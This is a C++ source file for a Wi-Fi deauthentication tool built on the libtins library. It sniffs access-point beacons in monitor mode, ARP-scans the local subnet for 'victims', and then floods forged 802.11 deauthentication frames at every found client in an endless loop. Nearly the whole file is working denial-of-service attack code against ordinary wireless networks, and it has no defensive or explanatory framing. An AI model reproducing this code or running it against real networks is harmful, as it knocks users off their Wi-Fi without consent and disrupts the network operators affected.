/*The MIT License (MIT)
 *
 * Copyright (c) 2016 Revimal(Hyeonho Seo)
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
*/

#include "wifi_deauth.h"

WifiDeauth::WifiDeauth(std::string _ifaceTrigger, std::string _ifaceScanner, uint16_t _channel)
    : ifaceTrigger(_ifaceTrigger), ifaceScanner(_ifaceScanner), rangeNet(Tins::IPv4Range::from_mask(ipNet, infoScanner.netmask)),
      strSniffer(_ifaceTrigger), channel(_channel){}


//Sniffer callback function for 'listingAP()'
bool WifiDeauth::callbackSniff(Tins::PDU &pdu) {
    const Tins::Dot11Beacon &beacon = pdu.rfind_pdu<Tins::Dot11Beacon>();
    if (!beacon.from_ds() && !beacon.to_ds()) {
        if(mapAP.find(beacon.ssid()) == mapAP.end()){
            mapAP.insert(std::pair<std::string, Tins::HWAddress<6> >(beacon.ssid(), beacon.addr2()));
            if(flgPrint)
                std::cout << "*AP Found! [ " << beacon.ssid() << " / " << beacon.addr2() << " ]" << std::endl;
        }
    }
    return true;
}

//This method finds 802.11 Beacon(AP) PDU captured from a monitor interface.
void WifiDeauth::listingAP(){
    Tins::SnifferConfiguration confSniff;
    confSniff.set_promisc_mode(true);
    confSniff.set_filter("type mgt subtype beacon");
    confSniff.set_rfmon(true);
    Tins::Sniffer sniffer(strSniffer, confSniff);
    if(flgPrint)
        std::cout << "[!] Listing Access-Point... [ Iterate : " << iterSniff << "pkts ]"<< std::endl;
    sniffer.sniff_loop(Tins::make_sniffer_handler(this, &WifiDeauth::callbackSniff), iterSniff);
}

void WifiDeauth::scanVictims(){
    if(flgPrint)
            std::cout << std::endl << "[!] ARP Scanning Start... [ Estimate Time : " <<
                         (std::distance(rangeNet.begin(), rangeNet.end()) * 2) << "sec ]" << std::endl;

    //Do ARP Scanning to all IP range addresses.
    for(const auto &target : rangeNet) {
        Tins::EthernetII scan = Tins::ARP::make_arp_request(target, infoScanner.ip_addr, infoScanner.hw_addr);
        std::unique_ptr<Tins::PDU> reply(sender.send_recv(scan, ifaceScanner));
        if(reply){
             vecVictims.push_back((reply -> rfind_pdu<Tins::ARP>()).sender_hw_addr());
             if(flgPrint)
                std::cout << "*Target Found! [ " << target << " / " << vecVictims.back() << " ]" << std::endl;
        }
    }
}

void WifiDeauth::deauthVictims(){
    std::cout << std::endl << "[!] Deauthentication Start... [ Press Ctrl+C to Exit ]" << std::endl;
    radio.channel(Tins::Utils::channel_to_mhz(channel), 0x00a0); //2407 + channel * 5, 0x00a0(802.11b)
    while(1){
        for(const auto &apTarget : vecFinalAP){
            deauth.addr1(apTarget);
            deauth.addr3(apTarget);
            for(const auto &macTarget : vecVictims){
                radio.release_inner_pdu();
                deauth.addr2(macTarget);
                radio.inner_pdu(deauth);
                sender.send(radio, ifaceTrigger);
            }
        }
    }
}

void WifiDeauth::runDeauth(){
    std::cout << std::endl << "[*]============= Wifi Deauthentication =============[*]" << std::endl;
    if(flgPrint){
        std::cout << "*Trigger Interface [ MAC Addr : " << infoTrigger.hw_addr << " ]" << std::endl;
        std::cout << "*Scanner Interface [ MAC Addr : " << infoScanner.hw_addr << " ]" << std::endl;
        std::cout << "*Target Network [ Address Range : " << ipNet << " ]" << std::endl << std::endl;
    }
    listingAP();
    scanVictims();

    if(flgPrint)
        std::cout << std::endl << "[!] Deauth Information" << std::endl;

    for(const auto &macAP : mapAP){
        auto iter = std::find(vecVictims.begin(), vecVictims.end(), macAP.second);
        if(iter != vecVictims.end()){
            vecVictims.erase(iter);
            vecFinalAP.push_back(macAP.second);
            if(flgPrint)
                std::cout << "*Target AP : " << macAP.first << " [ " << macAP.second << " ]" << std::endl;
        }
    }
    if(flgPrint)
        std::cout << "*Total : " << vecVictims.size() << std::endl << std::endl;

    deauthVictims();
}
